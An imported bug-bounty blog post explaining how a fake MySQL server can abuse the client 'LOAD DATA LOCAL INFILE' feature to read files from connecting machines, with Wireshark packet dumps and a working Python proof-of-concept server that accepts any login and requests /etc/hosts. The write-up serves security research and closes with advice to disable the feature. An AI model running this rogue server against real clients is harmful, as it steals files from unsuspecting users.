---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-15_abusing-mysql-clients-to-get-lfi-from-the-serverclient.md
original_filename: 2019-01-15_abusing-mysql-clients-to-get-lfi-from-the-serverclient.md
title: Abusing MySQL clients to get LFI from the server/client
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
- mfa
- api-security
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
- mfa
- api-security
language: en
raw_sha256: e4d51570b6d663ff56bcab8655260970543b66c106ca24afd7b2ee0c17fb3125
text_sha256: af388cbc903a2e7cb51709513ab6ddaba4dcd26d19aff226cb71feeced3f17c3
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Abusing MySQL clients to get LFI from the server/client

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-15_abusing-mysql-clients-to-get-lfi-from-the-serverclient.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal, mfa, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `e4d51570b6d663ff56bcab8655260970543b66c106ca24afd7b2ee0c17fb3125`
- Text SHA256: `af388cbc903a2e7cb51709513ab6ddaba4dcd26d19aff226cb71feeced3f17c3`


## Content

---
title: "Abusing MySQL clients to get LFI from the server/client"
page_title: "Abusing MySQL clients to get LFI from the server/client – vesiluoma.com"
url: "https://www.vesiluoma.com/abusing-mysql-clients/"
final_url: "https://www.vesiluoma.com/abusing-mysql-clients/"
authors: ["Jarkko Vesiluoma (@jvesiluoma)"]
bugs: ["LFI"]
publication_date: "2019-01-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5476
---

#  Abusing MySQL clients to get LFI from the server/client 

Thinking to expose your service that fetches content from some user given MySQL server? Think again. You may expose the client to LFI vulnerability via MySQL client **feature**.

![](https://www.vesiluoma.com/wp-content/uploads/2019/01/image-1-1024x367.png)

Recently I found a public webpage that was used to connect to a remote MySQL database, from a bug bounty program. User was able to input server address, username, password in the webpage and do some (restricted) administrative things like issue some predefined SQL queries. The page was always connecting to a MySQL port (3306/TCP) and the web UI was pretty limited and well done, so nothing really exploitable there, unfortunately. 

I setup my own test server with MySQL service running and tried to connect to it, but nothing fancy there either. Output from the database was pretty well sanitised and pretty much only thing that would have been possible was XSS that would have needed a lot of steps to perform. Must Try Harder.

Since the MySQL server always first sends a banner to the connecting client, I decided to do some digging if that would at least cause an XSS that would require less steps to perform. For fun and giggles, I decided to write a fake MySQL server that would do the authentication etc. steps needed for the client to connect and would serve some malicious content automatically to the server. I never got there. 

While researching the subject, I found that the MySQL client has a nice, well documented, feature “LOAD DATA” and with “LOAD DATA INFILE” the client actually loads a file from the CLIENT machine and sends it to the server, weird. And Awesome. And weird, really weird. It is very strange how this kind of feature that is so easily exploitable, is still open.

Some more research (=google for teh win) revealed that this has been exploited before, (articles dating back all the way to 2013!) and there is some good writeups of this already (links at the end of this post). But I wanted to do this myself, so…

I launched a wireshark and recorded the client – server login traffic from a real use case so I could check the data between the client and server. Checking this was pretty easy, since the clients and server traffic is easily readable ASCII.

![](https://www.vesiluoma.com/wp-content/uploads/2019/01/image-1024x289.png)

The image above is from the traffic when user logs in to the MySQL server and selects database. As we can see from the image below, the traffic is pretty easily readable. 

![](https://www.vesiluoma.com/wp-content/uploads/2019/01/wireshark_followtcp.png)

From the packet #29 “ _Login request user=teamrot_ ” (image below) we can also see that our client supports “ _LOAD DATA LOCAL_ ”. If this is not set, this won’t work. We could also use the following SQL query from the website itself:

![](https://www.vesiluoma.com/wp-content/uploads/2019/01/Selection_264.png)
  
  
  LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE disobey.test FIELDS TERMINATED BY "\n"

From here on out, it was pretty much parsing the correct stuff from the .pcap and send them to the client in following order:

  1. Greeting 
  2. Auth Ok 
  3. Payload 

This was the fun part. No matter what the client sends to the server, we just send back “Auth OK” packet and the client thinks it is authorised. After authorisation packet, the payload is send. Now the client thinks it is authenticated and does what the server tells it to do. Yay(?). Actually, this was also the scary part, malicious attacker could just setup a fake MySQL server and trick clients to connect to it and vóila, attacker gets files, uhh…Anyway, moving on…

Here is corrects parts parsed from the .pcap.

#1 Auth OK
  
  
  0000  b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00  °5.D.£..'.ò...E.
  0010  00 3f f9 5e 40 00 40 06 2c c0 0a 00 00 3d 0a 00  .?ù^@.@.,À...=..
  0020  00 5e 0c ea ce 64 05 79 a6 55 f5 b2 1e 7b 80 18  .^.êÎd.y¦Uõ².{..
  0030  00 eb fd 46 00 00 01 01 08 0a 00 b2 5c ab 1a 89  .ëýF.......²\«..
  0040  49 a8 07 00 00 02 00 00 00 02 00 00 00  I¨...........

#2. Server greeting:
  
  
  0000  b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00  °5.D.£..'.ò...E.
  0010  00 93 f9 5c 40 00 40 06 2c 6e 0a 00 00 3d 0a 00  ..ù\@.@.,n...=..
  0020  00 5e 0c ea ce 64 05 79 a5 f6 f5 b2 1d d2 80 18  .^.êÎd.y¥öõ².Ò..
  0030  00 e3 e6 34 00 00 01 01 08 0a 00 b2 5c aa 1a 89  .ãæ4.......²\ª..
  0040  49 a5 5b 00 00 00 0a 35 2e 36 2e 32 38 2d 30 75  I¥[....5.6.28-0u
  0050  62 75 6e 74 75 30 2e 31 34 2e 30 34 2e 31 00 2d  buntu0.14.04.1.-
  0060  00 00 00 40 3f 59 26 4b 2b 34 60 00 ff f7 08 02  ...@?Y&K+4`.ÿ÷..
  0070  00 7f 80 15 00 00 00 00 00 00 00 00 00 00 68 69  ..............hi
  0080  59 5f 52 5f 63 55 60 64 53 52 00 6d 79 73 71 6c  Y_R_cU`dSR.mysql
  0090  5f 6e 61 74 69 76 65 5f 70 61 73 73 77 6f 72 64  _native_password
  00a0  00  

#3. Request file (/etc/hosts)
  
  
  0000  b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00  °5.D.£..'.ò...E.
  0010  00 43 f9 5f 40 00 40 06 2c bb 0a 00 00 3d 0a 00  .Cù_@.@.,»...=..
  0020  00 5e 0c ea ce 64 05 79 a6 60 f5 b2 1e a0 80 18  .^.êÎd.y¦`õ². ..
  0030  00 eb e6 5c 00 00 01 01 08 0a 00 b2 5c ab 1a 89  .ëæ\.......²\«..
  0040  49 a9 0b 00 00 01 fb 2f 65 74 63 2f 68 6f 73 74  I©....û/etc/host
  0050  73  

To exploit this easily, I made a small (+crude+awful+quick) python script that does exactly what I wanted. This is just a poc, so no fancy features like detection of client OS, type, fetching of different files etc. that could be done.
  
  
  #!/usr/bin/python
  #coding: utf8
  import socket
  
  # linux :
  filestring = "/etc/hosts"
  # windows:
  #filestring = "C:\\Windows\\system32\\drivers\\etc\\hosts"
  HOST = "0.0.0.0" # open for eeeeveryone! ^_^
  PORT = 3306
  BUFFER_SIZE = 1024
  
  #1 Greeting
  greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
  #2 Accept all authentications
  authok = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
  
  #3 Payload
  payloadlen = "\x0b" 
  padding = "\x00\x00"
  payload = payloadlen + padding +  "\x0b\x00\x00\x01\xfb\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73"
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((HOST, PORT))
  s.listen(1)
  
  while True:
  conn, addr = s.accept()
  
  print 'Connection from:', addr
  conn.send(greeting)
  while True:
  data = conn.recv(BUFFER_SIZE)
  print " ".join("%02x" % ord(i) for i in data)
  conn.send(authok)
  data = conn.recv(BUFFER_SIZE)
  conn.send(payload)
  print "[*] Payload send!"
  data = conn.recv(BUFFER_SIZE)
  if not data: break
  print "Data received:", data
  break
  # Don't leave the connection open.
  conn.close()

Aaand a small video about exploiting this.

It’s weird how this kind of “feature” is still so open. This could be easily used to steal files from the victim, use as a LFI to steal files from the server etc. The “LOAD DATA LOCAL” – feature is enabled by default (usually), so you may want to check if you can disable the feature. This of course means that if you let users to set another MySQL server and/or connect from your computer to some MySQL server, there may be attacker that will be able to read your files…

Tested with:

PHP 7.0.32-0ubuntu0.16.04.1 (cli) ( NTS )

mysql Ver 8.0.13 for osx10.14 on x86_64 (Homebrew)

mysql Ver 14.14 Distrib 5.7.24, for Linux (x86_64) 

* * *

Links to source materials:

<https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html>

<https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f>

<https://dev.mysql.com/doc/refman/5.7/en/load-data.html>

[](https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fwww.vesiluoma.com%2Fabusing-mysql-clients%2F&linkname=Abusing%20MySQL%20clients%20to%20get%20LFI%20from%20the%20server%2Fclient "Facebook")[](https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fwww.vesiluoma.com%2Fabusing-mysql-clients%2F&linkname=Abusing%20MySQL%20clients%20to%20get%20LFI%20from%20the%20server%2Fclient "Twitter")[](https://www.addtoany.com/share)
